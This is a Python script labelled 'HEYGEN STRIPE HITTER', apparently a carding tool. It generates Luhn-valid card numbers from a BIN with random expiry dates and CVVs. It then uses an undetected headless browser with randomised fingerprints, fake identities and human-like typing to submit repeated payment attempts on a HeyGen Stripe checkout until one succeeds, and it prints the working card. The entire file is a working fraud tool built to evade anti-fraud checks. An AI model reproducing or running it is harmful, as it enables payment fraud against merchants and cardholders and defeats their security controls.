import asyncio
import random
from undetected_playwright import async_playwright
from person_generator import generate_random_person
from human_sim import human_type, human_click

def generate_card_from_bin(bin_str: str, length: int = 16):
    # Remove anything that's not digit or 'x'
    cleaned = ''.join(c for c in bin_str if c.isdigit() or c.lower() == 'x')
    
    # Replace 'x' with random digits
    base = ''
    for c in cleaned:
        if c.lower() == 'x':
            base += str(random.randint(0, 9))
        else:
            base += c
    
    # Pad to length-1 if needed
    while len(base) < length - 1:
        base += str(random.randint(0, 9))
    
    base = base[:length - 1]
    
    # Luhn check digit
    digits = [int(d) for d in base]
    for i in range(len(digits) - 1, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    total = sum(digits)
    check_digit = (10 - (total % 10)) % 10
    
    full_number = base + str(check_digit)
    
    month = f"{random.randint(1, 12):02d}"
    year = str(random.randint(2027, 2032))
    cvv = str(random.randint(100, 999)) if length == 16 else str(random.randint(1000, 9999))
    
    return {
        "number": full_number,
        "month": month,
        "year": year,
        "cvv": cvv,
        "expiry": f"{month}/{year[-2:]}"
    }

async def main():
    print("\n" + "="*60)
    print("      HEYGEN STRIPE HITTER - Multiple Attempts on Same Page")
    print("="*60 + "\n")
    
    checkout_url = input("HeyGen Checkout / Payment Link paste karo: ").strip()
    if not checkout_url.startswith("http"):
        print("Link galat lag raha hai... https:// se shuru hona chahiye")
        return
    
    bin_input = input("BIN (6-8 digits) ya pattern with x daalo: ").strip()
    if not bin_input:
        print("BIN to daalo bhai...")
        return
    
    max_attempts_input = input("Kitne attempts try karna hai? (default 10): ").strip()
    max_attempts = int(max_attempts_input) if max_attempts_input.isdigit() else 10
    
    print(f"\nTarget URL: {checkout_url}")
    print(f"BIN/Pattern: {bin_input}")
    print(f"Max attempts: {max_attempts}\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False, slow_mo=80)
        context = await browser.new_context(
            viewport={"width": 1366 + random.randint(-40, 40), "height": 768 + random.randint(-30, 30)},
            locale="en-US",
            timezone_id=random.choice(["America/New_York", "Europe/London", "Asia/Dubai", "Asia/Karachi"]),
            java_script_enabled=True,
            ignore_https_errors=True,
        )
        
        page = await context.new_page()
        
        attempt = 1
        success = False
        
        while attempt <= max_attempts and not success:
            print(f"\n[Attempt {attempt}/{max_attempts}]  New fingerprint + new person + new card")
            
            try:
                await page.goto(checkout_url, wait_until="networkidle", timeout=45000)
                await asyncio.sleep(random.uniform(2.8, 6.2))
                
                person = generate_random_person()
                card = generate_card_from_bin(bin_input)
                
                # Fill billing
                await human_type(page, 'input[name*="name"], input[autocomplete*="name"]', person["name"])
                await human_type(page, 'input[name*="address-line1"], input[name*="line1"]', person["address1"])
                if person["address2"]:
                    await human_type(page, 'input[name*="address-line2"], input[name*="line2"]', person["address2"])
                
                await human_type(page, 'input[name*="city"], input[autocomplete*="city"]', person["city"])
                await human_type(page, 'input[name*="postal"], input[name*="zip"]', person["zip"])
                await human_type(page, 'input[type="email"]', person["email"])
                
                # Card fields
                await human_type(page, '[data-elements-stable-field-name="cardNumber"], input[name="cardNumber"]', card["number"], (85, 190))
                await human_type(page, '[data-elements-stable-field-name="cardExpiry"], input[name="cardExpiry"]', card["expiry"])
                await human_type(page, '[data-elements-stable-field-name="cardCvc"], input[name="cardCvc"]', card["cvv"])
                
                print(f"   → {person['name']} | {card['number']} | {person['email']}")
                
                # Submit
                await human_click(page, 'button[type="submit"], .SubmitButton, [data-testid*="pay"], button:has-text("Pay"), button:has-text("Complete")')
                
                await asyncio.sleep(random.uniform(9, 18))
                
                # Basic success detection
                current_url = page.url.lower()
                page_content = await page.content()
                
                success_keywords = ["success", "thank you", "payment complete", "subscription active", "confirmed", "approved"]
                if any(kw in current_url or kw in page_content.lower() for kw in success_keywords):
                    print("\n" + "═"*70)
                    print("                  HITTTTTTTTTT !!!! PAYMENT SUCCESS")
                    print("═"*70)
                    print(f"Email     : {person['email']}")
                    print(f"Card      : {card['number']}|{card['month']}|{card['year']}|{card['cvv']}")
                    print(f"Name      : {person['name']}")
                    print(f"Address   : {person['address1']}, {person['city']} {person['zip']}")
                    print("═"*70 + "\n")
                    success = True
                    break
                
                print("   → Declined / No success → next attempt...")
                
            except Exception as e:
                print(f"   Attempt failed: {str(e)}")
            
            attempt += 1
            await asyncio.sleep(random.uniform(15, 38))  # wait before next attempt
        
        if not success:
            print("\nMax attempts khatam. Koi hit nahi mila is session mein.")
        
        await context.close()
        await browser.close()

asyncio.run(main())
